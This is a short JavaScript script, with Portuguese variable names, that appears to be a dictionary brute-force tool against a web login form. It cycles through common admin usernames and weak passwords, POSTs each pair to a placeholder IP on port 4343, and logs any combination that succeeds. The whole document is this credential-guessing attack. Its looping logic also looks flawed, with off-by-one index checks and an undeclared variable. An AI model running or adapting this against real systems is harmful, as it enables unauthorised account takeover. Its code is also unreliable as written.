const dicionario = {
    logins: ['adm', 'administrador', 'admin',],
    senhas: ['adm', '123', '1234', '12345', 'administrador', 'admin']
};

let data = {};
let find = {};

const ip = 'SEU_IP';
const urlAlvo = `http://${ip}:4343/login`;

let l = 0, s = 0;
let count = 0;
a();
function a() {
    count++;
    data.login = dicionario.logins[l];
    data.senha = dicionario.senhas[s];
    $.ajax({
        url: urlAlvo,
        type: 'POST',
        data: JSON.stringify(data),
        dataType: "json",
        contentType: "application/json; charset=utf-8",
        statusCode: {
            200: () => {
                bad = false;
                find.login = dicionario.logins[l];
                find.senha = dicionario.senhas[s];
                b();
            },
            401: () => {
                if (l++ > dicionario.logins.length) {
                    l = 0;
                    if (s++ > dicionario.senhas.length) {
                        s = 0;
                    }
                }
                if (l >= dicionario.logins.length && s >= dicionario.senhas.length) {
                    b();
                } else {
                    a();
                }
            }
        }
    });
}

function b() {
    console.log({ loginEncontrado: find });
}